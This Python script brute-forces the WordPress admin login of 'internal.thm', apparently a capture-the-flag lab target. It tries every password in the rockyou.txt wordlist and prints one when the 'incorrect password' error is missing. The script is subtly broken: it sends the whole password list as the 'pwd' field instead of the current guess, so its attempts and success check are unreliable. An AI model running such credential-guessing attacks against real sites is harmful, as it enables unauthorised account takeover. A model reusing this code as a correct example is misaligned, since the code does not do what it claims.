import requests

cookies = {
    'wordpress_test_cookie': 'WP+Cookie+check',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'http://internal.thm/blog/wp-login.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://internal.thm',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

passwords = [x.strip() for x in open('/home/kali/rockyou.txt', 'r').readlines() if x]

for password in passwords:
	data = {
	  'log': 'admin',
	  'pwd': passwords,
	  'wp-submit': 'Log In',
	  'redirect_to': 'http://internal.thm/blog/wp-admin/',
	  'testcookie': '1'
	}

	response = requests.post('http://internal.thm/blog/wp-login.php', headers=headers, cookies=cookies, data=data)

	if "<strong>Error</strong>: The password you entered for the username <strong>admin</strong> is incorrect. " not in response.text:
		print("Password Found: ", password)

